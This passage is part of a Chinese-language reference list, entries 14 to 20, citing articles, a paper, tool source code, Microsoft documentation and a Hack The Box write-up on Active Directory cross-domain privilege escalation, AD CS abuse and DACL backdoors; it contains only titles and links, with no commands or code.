- [14] [SID filter 是域之间的安全边界吗？（第 6 部分）——Schema change 信任攻击：从子域到父域](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [通过 ESC5 从 DA 提权至 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [滥用 AD CS，在 5 分钟内从子域管理员提权至企业管理员：后续篇](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [暗藏一手 ACE：设计 Active Directory DACL 后门](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k 模块源码](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership 属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
